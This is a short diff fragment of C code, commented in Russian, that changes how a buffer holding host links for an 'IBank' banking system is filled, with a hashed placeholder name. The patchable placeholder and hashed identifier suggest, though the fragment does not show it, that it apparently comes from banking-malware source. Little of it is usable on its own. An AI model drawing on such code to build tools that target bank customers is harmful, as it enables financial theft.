@@ -13,7 +13,7 @@
 //---------------------------------------------------------
 //  массив ссылок хостов системы IBank
 //---------------------------------------------------------
-char JAVA_HOSTS[JAVA_HOSTS_BUF_SIZE] = "_JAVA_HOSTS_\0";
+char JAVA_HOSTS[JAVA_PARAM_SIZE] = JAVA_PARAM_NAME;
 
 #define JAVA_HOSTS_HASH 0x2CFDA53B /* _JAVA_HOSTS_ */
 
